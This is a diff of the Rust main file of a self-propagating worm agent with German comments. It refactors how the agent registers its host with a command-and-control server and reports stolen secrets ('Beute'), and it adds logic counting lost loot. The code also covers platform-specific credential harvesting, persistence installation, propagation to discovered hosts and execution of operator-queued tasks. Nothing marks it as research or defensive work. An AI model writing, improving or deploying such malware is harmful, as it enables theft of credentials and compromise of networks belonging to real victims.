@@ -6,6 +6,7 @@
 
 mod c2;
 mod hostkey;
+mod meldung;
 mod propagate;
 mod tasks;
 
@@ -225,47 +226,21 @@ async fn main() {
         }
     };
 
-    // 0. Der Agent registriert sich selbst. Sonst zeigen die lokal erbeuteten
-    //    Secrets auf einen Host, den der C2-Server nicht kennt.
-    // Der Agent ist selbst ein Host — sein eigener Master-Key wird mit der
-    // Selbst-Registrierung gemeldet.
-    let eigenes = sealer.as_ref().and_then(|s| s.seal_for_host());
-    // Merkt sich, ob der C2-Server den Host kennt. Ohne Selbstregistrierung
-    // zeigt die Beute auf einen Host, den der Server nicht kennt — der Lauf
-    // hat dann nichts erreicht.
-    let mut registrierung_ok = true;
-    let self_registration = kx_core::c2::RegisterRequest {
+    // 0. Die eigene Beute sammeln und zusammen mit dem eigenen Host melden.
+    //    Der Host kommt zuerst: ohne ihn ist die Beute wertlos — sie könnte
+    //    keinem Zielhost zugeordnet werden. Das Melde-Modul besitzt die
+    //    Reihenfolge und die Zählung.
+    let local_secrets = collect_local_secrets().await;
+    let eigener_fund = meldung::HostFund {
         host_id: host_id.clone(),
         ip: host_id.clone(),
-        hostname: None,
         os: None,
-        status: Some(kx_core::c2::STATUS_AGENT.to_string()),
-        sealed_master: eigenes.as_ref().map(|k| k.sealed_master.clone()),
-        // Der Master-Key selbst wird nie gesendet — der Server bekommt nur
-        // das versiegelte Material.
-        master_key: None,
+        status: kx_core::c2::STATUS_AGENT.to_string(),
+        secrets: local_secrets,
     };
-    if let Err(e) = client.register_host(&self_registration).await {
-        error!("Selbst-Registrierung fehlgeschlagen: {e}");
-        registrierung_ok = false;
-    }
+    let mut ergebnis = meldung::melde(&client, sealer.as_ref(), &[eigener_fund]);
 
-    // 1. Lokale Secrets extrahieren (je nach Plattform).
-    let local_secrets = collect_local_secrets(&host_id, eigenes).await;
-    let mut hochgeladen = 0usize;
-    for s in &local_secrets {
-        match client.upload_secret(s).await {
-            Ok(()) => hochgeladen += 1,
-            Err(e) => error!("Secret-Upload fehlgeschlagen: {e}"),
-        }
-    }
-    info!(
-        "{} von {} lokalen Secrets hochgeladen",
-        hochgeladen,
-        local_secrets.len()
-    );
-
-    // 2. Persistenz installieren.
+    // 1. Persistenz installieren.
     if let Err(e) = install_persistence(&args).await {
         error!("Persistenz-Installation fehlgeschlagen: {e}");
     } else {
@@ -325,23 +300,12 @@ async fn main() {
     // gegen das Arbeitsverzeichnis des Prozesses auf — unter systemd ist das
     // das Wurzelverzeichnis.
     let relay_script = resolve_relay_script(&args.relay_script, binary_verzeichnis().as_deref());
-    let results = propagate::run_propagation(
-        &discovered,
-        &relay_script.to_string_lossy(),
-        sealer.as_ref(),
-    )
-    .await;
+    let funde = propagate::run_propagation(&discovered, &relay_script.to_string_lossy()).await;
 
-    // 4. Neuentdeckte Hosts an den C2-Server melden.
-    for h in &results.new_hosts {
-        let _ = client.register_host(h).await;
-    }
-    // Jedes Secret trägt die Kennung des Hosts, bei dem es erbeutet wurde.
-    for s in &results.new_secrets {
-        let _ = client.upload_secret(s).await;
-    }
+    // 3. Die Funde melden — je Host zuerst der Host, dann seine Beute.
+    ergebnis = ergebnis.zusammenfuehren(meldung::melde(&client, sealer.as_ref(), &funde));
 
-    // 5. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
+    // 4. Offene Tasks ausfuehren. Der Operator hat die Auftraege ueber
     //    `POST /api/tasks/new` angelegt; der Agent holt sie,
     //    fuehrt sie aus und meldet das Ergebnis zurueck.
     match tasks::run_pending_tasks(&client, &host_id).await {
@@ -349,10 +313,10 @@ async fn main() {
         Err(e) => error!("Task-Abholung fehlgeschlagen: {e}"),
     }
 
+    // Die Zusammenfassung nennt die zugestellte Beute, nicht die vorbereitete.
     info!(
-        "Agent-Lauf abgeschlossen: {} neue Hosts, {} neue Secrets",
-        results.new_hosts.len(),
-        results.new_secrets.len()
+        "Agent-Lauf abgeschlossen: {} Hosts registriert, {} Beute gemeldet, {} Beute verloren",
+        ergebnis.hosts_registriert, ergebnis.beute_gemeldet, ergebnis.beute_verloren
     );
 
     // Ein Lauf, der nichts erreicht, darf nicht als Erfolg melden. Der
@@ -360,12 +324,16 @@ async fn main() {
     // fehlgeschlagener Lauf muss im Journal als Fehlschlag stehen, sonst
     // merkt der Betreiber erst beim Blick ins Dashboard, dass der Wurm
     // längst tot ist.
-    if !registrierung_ok {
-        error!("Der Lauf hat den C2-Server nicht erreicht — der Agent meldet Fehlschlag");
-        std::process::exit(1);
-    }
-    if !local_secrets.is_empty() && hochgeladen == 0 {
-        error!("Kein einziger Secret-Upload geklappt — der Agent meldet Fehlschlag");
+    //
+    // Zwei Faelle zaehlen als Fehlschlag: der C2-Server war nicht erreichbar,
+    // oder Beute ging verloren, die der Agent erfolgreich erbeutet hatte. Ein
+    // gescheiterter Exploit ist keiner — nichts gefunden ist ein Ergebnis.
+    if ergebnis.fehlgeschlagen() {
+        error!(
+            "Der Lauf hat nicht alles erreicht — der Agent meldet Fehlschlag \
+             ({} Hosts verloren, {} Beute verloren)",
+            ergebnis.hosts_verloren, ergebnis.beute_verloren
+        );
         std::process::exit(1);
     }
 }
@@ -379,10 +347,11 @@ async fn main() {
 /// ist der Weg von der Extraktion zum Upload eine Schleife statt vier
 /// kopierter Blöcke. Die Quelle des Stücks steht im Secret — sie kommt vom
 /// Extraktor, der sie am besten kennt.
-async fn collect_local_secrets(
-    host_id: &str,
-    schluessel: Option<hostkey::SealedHostKey>,
-) -> Vec<kx_core::c2::SecretUpload> {
+///
+/// Das Versiegeln und das Melden liegen nicht hier, sondern im Modul
+/// [`meldung`]: der Master-Key gehört zum Host, und der Fund — nicht das
+/// einzelne Stück — ist die Einheit, die gemeldet wird.
+async fn collect_local_secrets() -> Vec<kx_core::secret::Secret> {
     let mut secrets: Vec<kx_core::secret::Secret> = Vec::new();
     #[cfg(target_os = "windows")]
     {
@@ -409,24 +378,7 @@ async fn collect_local_secrets(
         );
     }
 
-    // Der Master-Key gehoert zum Host, von dem das Stueck stammt. Ohne ihn
-    // geht die Beute im Klartext an den C2 — der dokumentierte Normalfall
-    // eines Agenten ohne Server-Schluessel.
-    let master_key = schluessel.as_ref().map(|k| k.roh.as_slice());
-
     secrets
-        .into_iter()
-        .filter_map(|secret| {
-            match kx_core::exfil::ExfiltratedSecret::new(&secret, master_key).upload(host_id) {
-                Ok(upload) => Some(upload),
-                // Der Klartext geht nicht als Ersatz raus — das Stueck bleibt.
-                Err(e) => {
-                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
-                    None
-                }
-            }
-        })
-        .collect()
 }
 
 /// Installiert Persistenz (Windows oder POSIX).
